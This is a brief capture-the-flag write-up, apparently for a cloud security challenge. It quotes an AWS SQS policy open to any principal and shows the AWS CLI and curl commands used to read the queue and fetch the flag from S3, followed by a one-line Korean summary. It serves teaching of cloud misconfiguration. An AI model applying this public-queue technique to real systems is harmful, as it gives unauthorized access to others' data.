# Q.

We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?

Join our queue and get the secret flag.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

# A.

```
> aws sqs receive-message --queue-url  https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "5b5a953c-fe6b-4396-92ce-015aa6a22873",
            "ReceiptHandle": "AQEBBqI7ZYlSEAT0o+94MdEfEOJi5TSZgw2G7AxB3vR8RSU9hBE2xCyEBXVdm4S3wMTn3VNaykbbMBPI/1X5s52vauTuOJFYDJMihbaifP4bXZtKTrSlRon3kUXbL3RZxdS
UJYCUi/YVFros4YZfTY6o2dwGnKN06PhfK/tS0bbm4V02iGOb5ygjnTe6mJp2f80Y7BFBxBWBaVPg7t4PBHYuzAOTbEAmtpNlNdKLTZBIp2ZnXqNt6YMC/wkIRbV3f/jiINQ5zEA8R49Hup/z5VIrfG9NAzw4fHse
bcXTxIJb89Ho8AwLNHbiegJNMAy2utInLe2eAnW5e5bE8uP1wN7RmlRjLSunp+QIqgF3meyUtjFIDebe5TGkF0aVYmoOvUBXAHkM5mfGp6fepRDLx5Qp9Tq3zIz6i46J+18vMQha/7w=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww
-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}

> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

# 풀이 설명

- Policy에서 확인한 리소스 이름으로 sqs 명령어로 메시지 획득해서 확인완료
